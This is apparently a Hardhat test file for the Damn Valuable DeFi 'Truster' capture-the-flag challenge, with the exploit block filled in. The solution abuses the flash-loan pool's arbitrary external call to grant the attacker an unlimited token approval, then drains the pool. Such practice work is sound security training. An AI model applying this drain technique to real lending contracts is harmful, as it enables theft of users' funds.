import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { DamnValuableToken, TrusterLenderPool } from '../../typechain';

describe('[Challenge] Truster', function () {
    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let token: DamnValuableToken, pool: TrusterLenderPool;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        token = await DamnValuableToken.deploy();
        pool = await TrusterLenderPool.deploy(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);

        expect(
            await token.balanceOf(pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const _interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
        const data = _interface.encodeFunctionData("approve", [attacker.address, ethers.constants.MaxUint256]);

        await pool.connect(attacker).flashLoan(0, attacker.address, token.address, data);
        await token.connect(attacker).transferFrom(pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal('0');
    });
});

